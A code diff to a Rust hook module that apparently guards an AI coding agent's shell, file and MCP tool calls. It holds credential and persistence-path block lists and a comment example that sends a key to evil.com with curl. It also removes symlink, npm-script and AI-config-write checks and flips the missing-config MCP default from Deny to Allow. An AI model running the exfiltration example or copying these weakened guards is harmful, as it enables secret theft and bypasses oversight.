@@ -17,17 +17,10 @@
 //! parser. The [`post_bash`] handler uses this to include budget usage
 //! information in its warnings.
 
-use std::collections::HashSet;
-use std::fmt::Write as _;
-
-use sha2::{Digest, Sha256};
-
-use crate::entropy::is_high_entropy_secret;
 use crate::hooks::protocol::{HookDecision, HookInput, HookOutput};
 use crate::mcp::audit::McpAuditLog;
 use crate::mcp::policy::McpPolicy;
-use crate::patterns::PATTERNS;
-use crate::redaction::{redact_credentials_no_entropy, RedactionEvent};
+use crate::redaction::redact_credentials;
 
 /// Npm/JS package manager configuration for hook behaviour.
 ///
@@ -39,8 +32,6 @@ pub struct NpmConfig {
     pub watch_lifecycle: bool,
     /// Whether to suggest `--ignore-scripts` in pre-bash npm install warnings.
     pub ignore_scripts_warning: bool,
-    /// Whether to REQUIRE `--ignore-scripts` (block without it).
-    pub ignore_scripts_required: bool,
     /// Package names that skip slopsquatting checks (known-good packages).
     pub allowlist: Vec<String>,
 }
@@ -50,138 +41,9 @@ impl Default for NpmConfig {
         Self {
             watch_lifecycle: true,
             ignore_scripts_warning: true,
-            ignore_scripts_required: false,
             allowlist: Vec::new(),
         }
     }
-}
-
-/// Entropy-based credential detection configuration.
-///
-/// Controls the Shannon entropy fallback that catches high-entropy secrets
-/// not matched by any regex pattern. These values are threaded from the
-/// config file through to the redaction engine.
-#[derive(Debug, Clone)]
-pub struct EntropyConfig {
-    /// Shannon entropy threshold (bits/char). Strings above this are flagged.
-    /// Default: 4.5.
-    pub threshold: f64,
-    /// Minimum string length for entropy scanning. Default: 20.
-    pub min_length: usize,
-    /// Strings that should be exempt from entropy-based detection.
-    pub allowlist: HashSet<String>,
-}
-
-impl Default for EntropyConfig {
-    fn default() -> Self {
-        Self {
-            threshold: 4.5,
-            min_length: 20,
-            allowlist: HashSet::new(),
-        }
-    }
-}
-
-/// Internal match type for the configurable redaction engine.
-struct RawCredentialMatch {
-    credential_type: &'static str,
-    start: usize,
-    end: usize,
-    matched_text: String,
-}
-
-/// Scan text for credentials, using configurable entropy parameters.
-///
-/// Like [] but uses the provided [] for the
-/// entropy fallback pass instead of hardcoded defaults. Allowlisted tokens are
-/// exempt from entropy-based detection.
-#[must_use]
-fn redact_credentials_with_config(
-    text: &str,
-    entropy_cfg: &EntropyConfig,
-) -> (String, Vec<RedactionEvent>) {
-    // Phase 1: regex-based pattern matching (identical to redact_credentials).
-    let mut raw_matches: Vec<RawCredentialMatch> = Vec::new();
-
-    for pattern in PATTERNS {
-        for mat in pattern.regex.find_iter(text) {
-            let matched = mat.as_str();
-            if pattern.name == "OpenAI API Key"
-                && (matched.starts_with("sk-ecdsa-") || matched.starts_with("sk-ed25519-"))
-            {
-                continue;
-            }
-            raw_matches.push(RawCredentialMatch {
-                credential_type: pattern.name,
-                start: mat.start(),
-                end: mat.end(),
-                matched_text: matched.to_owned(),
-            });
-        }
-    }
-
-    raw_matches.sort_by(|a, b| a.start.cmp(&b.start).then(b.end.cmp(&a.end)));
-
-    let mut selected: Vec<RawCredentialMatch> = Vec::new();
-    let mut last_end: usize = 0;
-    for m in raw_matches {
-        if m.start >= last_end {
-            last_end = m.end;
-            selected.push(m);
-        }
-    }
-
-    let mut result = String::with_capacity(text.len());
-    let mut events = Vec::with_capacity(selected.len());
-    let mut pos: usize = 0;
-
-    for m in &selected {
-        if m.start > pos {
-            result.push_str(&text[pos..m.start]);
-        }
-        let hash = Sha256::digest(m.matched_text.as_bytes());
-        let full_hex = hex::encode(hash);
-        let hash_prefix = &full_hex[..4];
-        let _ = write!(result, "[REDACTED:{}:{}]", m.credential_type, hash_prefix);
-        events.push(RedactionEvent {
-            credential_type: m.credential_type.to_owned(),
-            hash_prefix: hash_prefix.to_owned(),
-            start: m.start,
-            end: m.end,
-        });
-        pos = m.end;
-    }
-
-    if pos < text.len() {
-        result.push_str(&text[pos..]);
-    }
-
-    // Phase 2: entropy-based fallback with configurable parameters.
-    let mut entropy_pass = String::with_capacity(result.len());
-    for token in result.split_inclusive(|c: char| c.is_whitespace()) {
-        let trimmed = token.trim_end();
-        if !trimmed.starts_with("[REDACTED:")
-            && !entropy_cfg.allowlist.contains(trimmed)
-            && is_high_entropy_secret(trimmed, entropy_cfg.threshold, entropy_cfg.min_length)
-        {
-            let hash = Sha256::digest(trimmed.as_bytes());
-            let full_hex = hex::encode(hash);
-            let hash_prefix = &full_hex[..4];
-            let _ = write!(entropy_pass, "[POSSIBLE_SECRET_REDACTED:{hash_prefix}]");
-            let trailing = &token[trimmed.len()..];
-            entropy_pass.push_str(trailing);
-            events.push(RedactionEvent {
-                credential_type: "High-Entropy Secret".to_owned(),
-                hash_prefix: hash_prefix.to_owned(),
-                start: 0,
-                end: 0,
-            });
-        } else {
-            entropy_pass.push_str(token);
-        }
-    }
-
-    (entropy_pass, events)
 }
 
 /// Result of checking whether a package exists on a registry.
@@ -250,97 +112,7 @@ fn extract_all_packages(command: &str) -> Vec<(String, Registry)> {
         }
     }
 
-    // npx / yarn dlx / pnpm dlx / bunx patterns (package execution)
-    // These execute a package directly and should be checked for typosquatting.
-    // Also handle path-prefixed forms by extracting the command basename.
-    let normalised_cmd = strip_path_prefix_from_command(trimmed);
-    let exec_prefixes: &[(&str, Registry)] = &[
-        ("npx ", Registry::Npm),
-        ("yarn dlx ", Registry::Npm),
-        ("pnpm dlx ", Registry::Npm),
-        ("bunx ", Registry::Npm),
-    ];
-    for (prefix, registry) in exec_prefixes {
-        if let Some(rest) = normalised_cmd.strip_prefix(prefix) {
-            return parse_npx_args(rest, registry);
-        }
-    }
-
     Vec::new()
-}
-
-/// Strip filesystem path prefix from a command name.
-///
-/// Converts `/usr/local/bin/npx foo` to `npx foo` so the command name can be
-/// matched against known patterns regardless of how the binary is invoked.
-fn strip_path_prefix_from_command(command: &str) -> &str {
-    let trimmed = command.trim();
-    // If the command starts with a path, extract the basename
-    if trimmed.starts_with('/') {
-        if let Some(space_pos) = trimmed.find(' ') {
-            let path_part = &trimmed[..space_pos];
-            // Extract basename from path
-            if let Some(base) = path_part.rsplit('/').next() {
-                // Find where the base starts in the original and return from there
-                let base_start = space_pos - base.len();
-                return &trimmed[base_start..];
-            }
-        }
-    }
-    trimmed
-}
-
-/// Parse npx-style arguments, handling -p/--package as value-taking flags.
-///
-/// Unlike `parse_package_args`, this handles npx-specific flags:
-/// - `-p`/`--package` take a value argument (the package name to check)
-/// - `-y`/`--yes` are boolean flags that are skipped
-/// - The first non-flag token is the package to execute
-fn parse_npx_args(args: &str, registry: &Registry) -> Vec<(String, Registry)> {
-    let mut packages = Vec::new();
-    let mut tokens = args.split_whitespace();
-    let mut found_package_flag = false;
-
-    while let Some(token) = tokens.next() {
-        if token.starts_with('-') {
-            // Handle --package=value and -p=value forms
-            if let Some(val) = token
-                .strip_prefix("--package=")
-                .or_else(|| token.strip_prefix("-p="))
-            {
-                let name = extract_pkg_name_from_token(val);
-                if !name.is_empty() {
-                    packages.push((name.to_owned(), registry.clone()));
-                }
-                found_package_flag = true;
-                continue;
-            }
-            // Handle -p/--package as value-taking flags: consume the NEXT token
-            if token == "-p" || token == "--package" {
-                if let Some(next) = tokens.next() {
-                    let name = extract_pkg_name_from_token(next);
-                    if !name.is_empty() {
-                        packages.push((name.to_owned(), registry.clone()));
-                    }
-                }
-                found_package_flag = true;
-                continue;
-            }
-            // Skip other flags (-y, --yes, -c, etc.)
-            continue;
-        }
-        // First non-flag token: if --package was already specified, this is the
-        // command to execute (not a separate package). Otherwise it IS the package.
-        if !found_package_flag {
-            let name = extract_pkg_name_from_token(token);
-            if !name.is_empty() {
-                packages.push((name.to_owned(), registry.clone()));
-            }
-        }
-        // Stop after the first non-flag token (remaining tokens are arguments)
-        break;
-    }
-    packages
 }
 
 /// Parse package arguments from the portion after `install`, filtering flags.
@@ -543,30 +315,6 @@ fn contains_env_var_ref(command: &str, var: &str) -> bool {
     false
 }
 
-/// Resolve symlinks by checking if the path is a symlink and following it.
-///
-/// If the path is a symlink, returns the resolved (canonicalized) path.
-/// If canonicalization fails or the path is not a symlink, returns `None`.
-/// This is best-effort: filesystem errors cause a warning but do not block.
-fn resolve_symlink(path: &str) -> Option<String> {
-    let p = std::path::Path::new(path);
-    let meta = std::fs::symlink_metadata(p).ok()?;
-    if !meta.file_type().is_symlink() {
-        return None;
-    }
-    match std::fs::canonicalize(p) {
-        Ok(resolved) => Some(resolved.to_string_lossy().into_owned()),
-        Err(e) => {
-            tracing::warn!(
-                path = %path,
-                error = %e,
-                "symlink detected but canonicalization failed \u{2014} allowing"
-            );
-            None
-        }
-    }
-}
-
 /// Normalize a path string by expanding `~`/`$HOME` and collapsing `/../`
 /// and `/./` segments.
 ///
@@ -641,6 +389,19 @@ const SENSITIVE_READ_PATHS: &[&str] = &[
     "$HOME/.config/gh/",
     "~/.local/share/keyrings/",
     "$HOME/.local/share/keyrings/",
+    // AI tool configuration directories
+    "~/.claude/",
+    "$HOME/.claude/",
+    "~/.cursor/",
+    "$HOME/.cursor/",
+    "~/.copilot/",
+    "$HOME/.copilot/",
+    "~/.aider/",
+    "$HOME/.aider/",
+    "~/.cline/",
+    "$HOME/.cline/",
+    "~/.roo/",
+    "$HOME/.roo/",
 ];
 
 /// Sensitive file name patterns that should never be read.
@@ -667,6 +428,10 @@ const SENSITIVE_READ_FILES: &[&str] = &[
     ".zsh_history",
     ".node_repl_history",
     ".python_history",
+    // AI tool configuration files (project-level)
+    ".claude/settings.json",
+    ".claude/settings.local.json",
+    ".cursor/mcp.json",
 ];
 
 /// Sensitive environment variable names whose values should not be echoed.
@@ -1060,21 +825,6 @@ const HIGH_RISK_WRITE_PATHS: &[&str] = &[
     "/cron",             // Scheduled execution persistence (crontab, cron.d, etc.)
     "/crontab",          // Scheduled execution persistence
     "/.config/systemd/", // Systemd autostart (boot persistence)
-    // AI assistant config dotfiles (prompt injection / MCP config poisoning)
-    "/.claude.json",
-    "/.claude/",
-    "/.cursor/mcp.json",
-    "/.cursor/mcp/",
-    "/.cursor/rules/",
-    "/.continue/config.json",
-    "/.continue/config/",
-    "/.windsurf/mcp.json",
-    "/.codeium/",
-    "/.github/copilot-instructions.md",
-    "/.copilot/",
-    "/.aider/",
-    "/.cline/",
-    "/.roo/",
 ];
 
 /// Sensitive write destinations that warrant a warning (shell configuration
@@ -1163,13 +913,17 @@ fn is_credential_file_access(command: &str) -> bool {
     // that "cat\t.env" matches the same as "cat .env".
     let normalised = command.replace('\t', " ");
 
+    // Case-insensitive matching for macOS APFS (case-preserving filesystem).
+    // Lowercasing only for credential path pattern matching, not for display.
+    let normalised_lower = normalised.to_ascii_lowercase();
+
     // 1. Check direct read commands (cat, less, head, tail, more).
     for cmd in DIRECT_READ_COMMANDS {
         let space_variant = format!("{cmd} ");
         // Check both original (tab) and normalised (space) forms.
         if normalised.contains(&space_variant) || command_invokes(&normalised, cmd) {
             for pattern in CREDENTIAL_FILE_PATTERNS {
-                if matches_credential_pattern(&normalised, pattern) {
+                if matches_credential_pattern(&normalised_lower, pattern) {
                     return true;
                 }
             }
@@ -1181,7 +935,7 @@ fn is_credential_file_access(command: &str) -> bool {
         let space_variant = format!("{cmd} ");
         if normalised.contains(&space_variant) || command_invokes(&normalised, cmd) {
             for pattern in CREDENTIAL_FILE_PATTERNS {
-                if matches_credential_pattern(&normalised, pattern) {
+                if matches_credential_pattern(&normalised_lower, pattern) {
                     return true;
                 }
             }
@@ -1197,12 +951,12 @@ fn is_credential_file_access(command: &str) -> bool {
         let redir_space = format!("< {pattern}");
         if EXACT_FILENAME_PATTERNS.contains(pattern) {
             // For exact patterns, check with word-boundary after redirect
-            if matches_credential_pattern(&normalised, &redir_no_space)
-                || matches_credential_pattern(&normalised, &redir_space)
+            if matches_credential_pattern(&normalised_lower, &redir_no_space)
+                || matches_credential_pattern(&normalised_lower, &redir_space)
             {
                 return true;
             }
-        } else if normalised.contains(&redir_no_space) || normalised.contains(&redir_space) {
+        } else if normalised_lower.contains(&redir_no_space) || normalised_lower.contains(&redir_space) {
             return true;
         }
     }
@@ -1456,213 +1210,6 @@ fn is_pip_install_command(normalised: &str) -> bool {
         || normalised.ends_with("pip3 install")
 }
 
-/// Fetch a package.json from the npm registry for pre-execution analysis.
-///
-/// Attempts to read from the local cache first (`$XDG_CACHE_HOME/sanctum/registry/`
-/// or `~/.cache/sanctum/registry/`). If the cache is missing or stale (>24 hours),
-/// fetches from `https://registry.npmjs.org/{name}/{version}` using `curl` with
-/// a 1-second timeout.
-///
-/// Returns `Ok(content)` on success, `Err(reason)` on failure. Failures are not
-/// fatal -- the caller should warn and continue.
-fn fetch_registry_package_json(name: &str, version: Option<&str>) -> Result<String, String> {
-    if !is_valid_curl_package_name(name) {
-        return Err(format!("invalid package name: {name}"));
-    }
-    let ver = version.unwrap_or("latest");
-    let cache_key = format!("{name}@{ver}.json");
-    let cache_dir = registry_cache_dir();
-
-    // Try cache first (TTL: 24 hours)
-    if let Some(ref dir) = cache_dir {
-        let cache_path = dir.join(&cache_key);
-        if let Ok(metadata) = std::fs::metadata(&cache_path) {
-            if let Ok(modified) = metadata.modified() {
-                if let Ok(elapsed) = modified.elapsed() {
-                    if elapsed.as_secs() < 86400 {
-                        if let Ok(cached) = std::fs::read_to_string(&cache_path) {
-                            return Ok(cached);
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    // Fetch from registry
-    let url = if ver == "latest" {
-        format!("https://registry.npmjs.org/{name}/latest")
-    } else {
-        format!("https://registry.npmjs.org/{name}/{ver}")
-    };
-
-    let result = std::process::Command::new("curl")
-        .args([
-            "-s",
-            "--max-time",
-            "1",
-            "--connect-timeout",
-            "1",
-            "--max-redirs",
-            "0",
-            &url,
-        ])
-        .output();
-
-    match result {
-        Ok(output) if output.status.success() => {
-            let body = String::from_utf8_lossy(&output.stdout).to_string();
-            // Write to cache (best-effort)
-            if let Some(ref dir) = cache_dir {
-                let _ = std::fs::create_dir_all(dir);
-                let cache_path = dir.join(&cache_key);
-                let _ = std::fs::write(&cache_path, &body);
-            }
-            Ok(body)
-        }
-        Ok(output) => Err(format!("curl returned status {}", output.status)),
-        Err(e) => Err(format!("curl not available: {e}")),
-    }
-}
-
-/// Return the registry cache directory path.
-fn registry_cache_dir() -> Option<std::path::PathBuf> {
-    let base = std::env::var("XDG_CACHE_HOME")
-        .ok()
-        .filter(|s| !s.is_empty())
-        .or_else(|| {
-            std::env::var("HOME")
-                .ok()
-                .map(|h| format!("{h}/.cache"))
-        })?;
-    Some(std::path::PathBuf::from(base).join("sanctum/registry"))
-}
-
-/// Run `check_patterns()` from the sentinel npm scanner on registry package.json
-/// content. Returns warnings/blocks based on risk level.
-fn analyze_registry_package(
-    name: &str,
-    pkg_json_content: &str,
-) -> Option<(sanctum_sentinel::npm::scanner::RiskLevel, Vec<String>)> {
-    let pkg: serde_json::Value = serde_json::from_str(pkg_json_content).ok()?;
-    let scripts = pkg.get("scripts")?.as_object()?;
-
-    let lifecycle_keys = [
-        "preinstall", "install", "postinstall", "preuninstall", "uninstall",
-        "postuninstall", "prepublish", "preprepare", "prepare", "postprepare",
-        "prepack", "postpack",
-    ];
-
-    let mut max_risk = sanctum_sentinel::npm::scanner::RiskLevel::Low;
-    let mut messages = Vec::new();
-
-    for key in &lifecycle_keys {
-        if let Some(script_val) = scripts.get(*key) {
-            if let Some(script_str) = script_val.as_str() {
-                let findings = sanctum_sentinel::npm::scanner::check_patterns(
-                    script_str,
-                    &format!("{name}:scripts.{key}"),
-                );
-                for finding in &findings {
-                    if finding.level > max_risk {
-                        max_risk = finding.level;
-                    }
-                    messages.push(format!(
-                        "Package \'{name}\' scripts.{key}: {} (risk: {})",
-                        finding.pattern, finding.level
-                    ));
-                }
-            }
-        }
-    }
-
-    if messages.is_empty() {
-        None
-    } else {
-        Some((max_risk, messages))
-    }
-}
-
-/// Pre-execution analysis of npm packages: fetch package.json from registry
-/// and run scanner patterns. Returns warnings or blocks.
-///
-/// Skips bare `npm install` (no explicit packages). Uses `thread::scope`
-/// for parallel fetches (capped at 4 concurrent via simple counter).
-fn pre_analyze_npm_packages(packages: &[(String, Registry)]) -> Vec<HookOutput> {
-    use std::sync::{Arc, Mutex};
-
-    let npm_pkgs: Vec<&str> = packages
-        .iter()
-        .filter(|(_, r)| *r == Registry::Npm)
-        .map(|(name, _)| name.as_str())
-        .collect();
-
-    if npm_pkgs.is_empty() {
-        return Vec::new();
-    }
-
-    let results: Arc<Mutex<Vec<HookOutput>>> = Arc::new(Mutex::new(Vec::new()));
-
-    // Process in batches of 4 to limit concurrency
-    for chunk in npm_pkgs.chunks(4) {
-        std::thread::scope(|s| {
-            let handles: Vec<_> = chunk
-                .iter()
-                .map(|name| {
-                    let results = results.clone();
-                    s.spawn(move || {
-                        let fetch_result = fetch_registry_package_json(name, None);
-                        match fetch_result {
-                            Ok(body) => {
-                                if let Some((risk, messages)) =
-                                    analyze_registry_package(name, &body)
-                                {
-                                    let output = match risk {
-                                        sanctum_sentinel::npm::scanner::RiskLevel::Critical
-                                        | sanctum_sentinel::npm::scanner::RiskLevel::High => {
-                                            HookOutput::block(format!(
-                                                "Blocked: package \'{name}\' has suspicious lifecycle scripts:\\n{}",
-                                                messages.join("\\n")
-                                            ))
-                                        }
-                                        sanctum_sentinel::npm::scanner::RiskLevel::Medium => {
-                                            HookOutput::warn(format!(
-                                                "Warning: package \'{name}\' has suspicious lifecycle scripts:\\n{}",
-                                                messages.join("\\n")
-                                            ))
-                                        }
-                                        sanctum_sentinel::npm::scanner::RiskLevel::Low => return,
-                                    };
-                                    if let Ok(mut r) = results.lock() {
-                                        r.push(output);
-                                    }
-                                }
-                            }
-                            Err(reason) => {
-                                if let Ok(mut r) = results.lock() {
-                                    r.push(HookOutput::warn(format!(
-                                        "Warning: could not fetch registry metadata for \'{name}\': {reason}"
-                                    )));
-                                }
-                            }
-                        }
-                    })
-                })
-                .collect();
-
-            for handle in handles {
-                let _ = handle.join();
-            }
-        });
-    }
-
-    // unwrap is safe here because we hold the only Arc and all threads have joined
-    Arc::try_unwrap(results)
-        .ok()
-        .and_then(|m| m.into_inner().ok())
-        .unwrap_or_default()
-}
-
 /// Evaluate a pre-bash hook.
 ///
 /// - **BLOCK**: Reading credential files (via direct or indirect commands,
@@ -1777,11 +1324,10 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
     }
 
     // Check for credential VALUES embedded in the command text.
-    // This catches inline exfiltration like: curl https://evil.com -d "sk-proj-..."
+    // This catches inline exfiltration like: curl https://evil.com -d "sk-proj-abc123..."
     // High-entropy detections are filtered out (too noisy for shell commands).
     {
-        let entropy_cfg = EntropyConfig::default();
-        let (_, events) = redact_credentials_with_config(command, &entropy_cfg);
+        let (_, events) = redact_credentials(command);
         let high_confidence: Vec<_> = events
             .iter()
             .filter(|e| e.credential_type != "High-Entropy Secret")
@@ -1859,27 +1405,11 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
             }
         }
 
-        // Task 5: Block if ignore_scripts_required and --ignore-scripts is missing.
-        if is_npm_install
-            && npm_config.ignore_scripts_required
-            && !packages.is_empty()
-            && !normalised.contains("--ignore-scripts")
-        {
-            return HookOutput::block(
-                "Blocked: npm install without --ignore-scripts is not permitted \
-                 when ignore_scripts_required is enabled\n\
-                 To proceed: add --ignore-scripts to the command"
-                    .to_owned(),
-            );
-        }
-
         // If we got here with no packages extracted, it might be a bare install
         // from lockfile (e.g., `npm install`, `pip install .`), or packages
         // were all allowlisted. Just check for ignore-scripts suggestion.
-        // Skip the soft tip when ignore_scripts_required is already enforcing.
         if is_npm_install
             && npm_config.ignore_scripts_warning
-            && !npm_config.ignore_scripts_required
             && !packages.is_empty()
             && !normalised.contains("--ignore-scripts")
         {
@@ -1893,29 +1423,9 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
             return HookOutput::warn(warnings.join("\n"));
         }
 
-        // Task 6: Pre-execution package.json analysis for npm packages.
-        // Skip for bare `npm install` / `npm ci` (no explicit packages).
-        if is_npm_install && !packages.is_empty() {
-            let analysis_results = pre_analyze_npm_packages(&packages);
-            for result in &analysis_results {
-                if result.decision == HookDecision::Block {
-                    return result.clone();
-                }
-            }
-            // Collect warnings from analysis
-            for result in analysis_results {
-                if let Some(msg) = result.message {
-                    warnings.push(msg);
-                }
-            }
-        }
-
         // M16: If all packages were verified or this is a bare install,
         // proceed without the generic pip install warning.
         if !packages.is_empty() {
-            if !warnings.is_empty() {
-                return HookOutput::warn(warnings.join("\n"));
-            }
             return HookOutput::allow();
         }
     }
@@ -1992,120 +1502,30 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
 /// Maximum recursion depth for scanning JSON values for credentials.
 const MAX_CREDENTIAL_SCAN_DEPTH: usize = 8;
 
-/// JSON key names where high-entropy strings are expected and benign.
-///
-/// When the parent key matches one of these patterns (case-insensitive),
-/// the entropy-based fallback in `redact_credentials` is skipped.
-/// Pattern-based detection still runs, so real credentials (e.g. `sk-proj-...`)
-/// under a hash key are still caught.
-const ENTROPY_EXEMPT_KEY_PATTERNS: &[&str] = &[
-    "hash", "digest", "checksum", "nonce", "uuid", "id", "image",
-    "cert", "certificate", "signature", "commit", "ref", "etag",
-    "fingerprint",
-];
-
-/// Returns `true` if `key` matches one of the entropy-exempt patterns.
-///
-/// Also matches keys with numeric suffixes like `sha256`, `sha512`,
-/// `token_id`, `request_id`, `trace_id`.
-fn is_entropy_exempt_key(key: &str) -> bool {
-    if key.is_empty() {
-        return false;
-    }
-    let lower = key.to_ascii_lowercase();
-    // Direct matches
-    for &pat in ENTROPY_EXEMPT_KEY_PATTERNS {
-        if lower == pat {
-            return true;
-        }
-    }
-    // sha + optional digits (sha256, sha512, sha1, etc.)
-    if lower.starts_with("sha") && lower[3..].chars().all(|c| c.is_ascii_digit()) {
-        return true;
-    }
-    // Compound key patterns: token_id, request_id, trace_id
-    if lower == "token_id" || lower == "request_id" || lower == "trace_id" {
-        return true;
-    }
-    false
-}
-
-/// A credential finding with its source key context.
-#[derive(Debug, Clone)]
-struct CredentialFinding {
-    /// The credential type (e.g. `OpenAI API Key`).
-    credential_type: String,
-    /// The JSON key where the credential was found (e.g. `old_string`, `new_string`).
-    source_key: String,
-}
-
 /// Recursively collect credential types from all string values in a JSON value.
 ///
 /// Scans `content`, `new_string`, `old_string`, and any nested structures
 /// including `operations` arrays in `MultiEdit` format. Skips non-content keys
 /// like `file_path`, `path`, `command` to avoid false positives.
-///
-/// Now also tracks WHICH key contained the credential so callers can
-/// distinguish between `old_string`-only and `new_string` credentials.
-#[allow(dead_code)]
-fn collect_credential_types(value: &serde_json::Value, out: &mut Vec<String>, depth: usize, entropy_cfg: &EntropyConfig) {
-    let mut findings = Vec::new();
-    collect_credential_findings(value, &mut findings, depth, "", entropy_cfg);
-    for f in &findings {
-        if !out.contains(&f.credential_type) {
-            out.push(f.credential_type.clone());
-        }
-    }
-}
-
-/// Keys that contain content being REMOVED (the text being replaced).
-/// Credentials in these keys only are less dangerous -- the edit is removing them.
-const OLD_STRING_KEYS: &[&str] = &["old_string"];
-
-/// Returns true if ALL credential findings are exclusively in `old_string`
-/// positions (not in `new_string`, `content`, or `operations[].new_string`).
-fn credentials_only_in_old_string(findings: &[CredentialFinding]) -> bool {
-    if findings.is_empty() {
-        return false;
-    }
-    findings.iter().all(|f| OLD_STRING_KEYS.contains(&f.source_key.as_str()))
-}
-
-/// Recursively collect credential findings with key context from JSON values.
-///
-/// Tracks the parent key name so that callers can determine whether
-/// credentials appeared only in `old_string` (removal) or in `new_string`/`content`
-/// (introduction). Uses configurable entropy parameters for secret detection.
-fn collect_credential_findings(
-    value: &serde_json::Value,
-    out: &mut Vec<CredentialFinding>,
-    depth: usize,
-    current_key: &str,
-    entropy_cfg: &EntropyConfig,
-) {
+fn collect_credential_types(value: &serde_json::Value, out: &mut Vec<String>, depth: usize) {
     if depth > MAX_CREDENTIAL_SCAN_DEPTH {
         return;
     }
     match value {
         serde_json::Value::String(s) => {
             if !s.is_empty() {
-                let skip_entropy = is_entropy_exempt_key(current_key);
-                let (_, events) = if skip_entropy {
-                    redact_credentials_no_entropy(s)
-                } else {
-                    redact_credentials_with_config(s, entropy_cfg)
-                };
+                let (_, events) = redact_credentials(s);
                 for event in &events {
-                    out.push(CredentialFinding {
-                        credential_type: event.credential_type.clone(),
-                        source_key: current_key.to_owned(),
-                    });
+                    let ctype = event.credential_type.as_str().to_owned();
+                    if !out.contains(&ctype) {
+                        out.push(ctype);
+                    }
                 }
             }
         }
         serde_json::Value::Array(arr) => {
             for item in arr {
-                collect_credential_findings(item, out, depth + 1, current_key, entropy_cfg);
+                collect_credential_types(item, out, depth + 1);
             }
         }
         serde_json::Value::Object(map) => {
@@ -2116,14 +1536,12 @@ fn collect_credential_findings(
                 if SKIP_KEYS.contains(&key.as_str()) {
                     continue;
                 }
-                collect_credential_findings(val, out, depth + 1, key.as_str(), entropy_cfg);
+                collect_credential_types(val, out, depth + 1);
             }
         }
         _ => {}
     }
 }
-
-
 
 /// Evaluate a pre-write hook.
 ///
@@ -2146,25 +1564,6 @@ pub fn pre_write(input: &HookInput) -> HookOutput {
         .unwrap_or("");
     // Normalize path to collapse /../ traversal before any matching
     let file_path = normalize_path(raw_file_path);
-
-    // Resolve symlinks: if the path is a symlink, also check the target.
-    if let Some(resolved) = resolve_symlink(&file_path) {
-        let resolved_input = HookInput {
-            tool_name: input.tool_name.clone(),
-            tool_input: {
-                let mut v = input.tool_input.clone();
-                if let Some(obj) = v.as_object_mut() {
-                    obj.insert("file_path".to_owned(), serde_json::Value::String(resolved));
-                }
-                v
-            },
-            config: input.config.clone(),
-        };
-        let resolved_output = pre_write(&resolved_input);
-        if resolved_output.decision == HookDecision::Block {
-            return resolved_output;
-        }
-    }
 
     // Block writing .pth files (Python supply chain attack vector)
     if std::path::Path::new(&file_path)
@@ -2199,28 +1598,9 @@ pub fn pre_write(input: &HookInput) -> HookOutput {
     // pre_bash credential blocking is already unconditional, and config hardening
     // forces the flag to true anyway.
     {
-        let entropy_cfg = EntropyConfig::default();
-
-        let mut findings = Vec::new();
-        collect_credential_findings(&input.tool_input, &mut findings, 0, "", &entropy_cfg);
-        if !findings.is_empty() {
-            let credential_types: Vec<String> = {
-                let mut types = Vec::new();
-                for f in &findings {
-                    if !types.contains(&f.credential_type) {
-                        types.push(f.credential_type.clone());
-                    }
-                }
-                types
-            };
-            if credentials_only_in_old_string(&findings) {
-                return HookOutput::warn(format!(
-                    "Warning: old_string contains credential values ([REDACTED]). \
-                     The value was present in the tool call payload sent to the LLM. \
-                     Detected types: {}",
-                    credential_types.join(", ")
-                ));
-            }
+        let mut credential_types = Vec::new();
+        collect_credential_types(&input.tool_input, &mut credential_types, 0);
+        if !credential_types.is_empty() {
             return HookOutput::block(format!(
                 "Blocked: file content contains detected credentials: {}\n\
                  To proceed: verify and run this command directly in your terminal (outside Claude Code)",
@@ -2231,9 +1611,8 @@ pub fn pre_write(input: &HookInput) -> HookOutput {
 
     // Block writes to high-risk persistence paths (SSH persistence,
     // scheduled execution, boot persistence).
-    // Case-insensitive matching for macOS APFS (case-preserving filesystem).
     for pattern in HIGH_RISK_WRITE_PATHS {
-        if file_path_lower.contains(pattern) {
+        if file_path.contains(pattern) {
             return HookOutput::block(format!(
                 "Blocked: writing to high-risk persistence path '{file_path}' is not permitted\n\
                  To proceed: verify and run this command directly in your terminal (outside Claude Code)"
@@ -2242,9 +1621,8 @@ pub fn pre_write(input: &HookInput) -> HookOutput {
     }
 
     // Warn when writing to other sensitive paths (shell configs, SSH config)
-    // Case-insensitive matching for macOS APFS.
     for pattern in SENSITIVE_WRITE_PATHS {
-        if file_path_lower.contains(pattern) {
+        if file_path.contains(pattern) {
             return HookOutput::warn(format!(
                 "Warning: writing to sensitive path {file_path} — verify this is intentional"
             ));
@@ -2274,20 +1652,6 @@ pub fn pre_read(input: &HookInput) -> HookOutput {
         .unwrap_or("");
     // Normalize path to collapse /../ traversal before any matching
     let file_path = normalize_path(raw_file_path);
-
-    // Resolve symlinks: if the path is a symlink, also check the target.
-    // This prevents symlink-based bypasses (e.g., `ln -s ~/.s_sh/key /tmp/safe`).
-    if let Some(resolved) = resolve_symlink(&file_path) {
-        let resolved_input = HookInput {
-            tool_name: input.tool_name.clone(),
-            tool_input: serde_json::json!({ "file_path": resolved }),
-            config: input.config.clone(),
-        };
-        let resolved_output = pre_read(&resolved_input);
-        if resolved_output.decision == HookDecision::Block {
-            return resolved_output;
-        }
-    }
 
     // Case-insensitive matching for macOS APFS (case-preserving filesystem)
     let path_lower = file_path.to_lowercase();
@@ -2348,10 +1712,8 @@ pub fn pre_mcp_tool_use(input: &HookInput, audit_log: Option<&mut McpAuditLog>) 
     }
 
     // Load MCP policy rules and default policy from config.
-    // Fail-closed: when no config is available, default to Deny to prevent
-    // unmatched MCP tools from silently executing.
     let (mcp_rules, default_mcp_policy) = input.config.as_ref().map_or_else(
-        || (Vec::new(), sanctum_types::config::McpDefaultPolicy::Deny),
+        || (Vec::new(), sanctum_types::config::McpDefaultPolicy::Allow),
         |cfg| (cfg.mcp_rules.clone(), cfg.default_mcp_policy),
     );
 
@@ -2586,7 +1948,6 @@ pub fn post_bash(input: &HookInput) -> HookOutput {
 
 /// Inner post-bash handler that also accepts npm configuration.
 #[must_use]
-#[allow(clippy::too_many_lines)]
 pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> HookOutput {
     if let Some(ref cfg) = input.config {
         if !cfg.claude_hooks {
@@ -2663,9 +2024,8 @@ pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> H
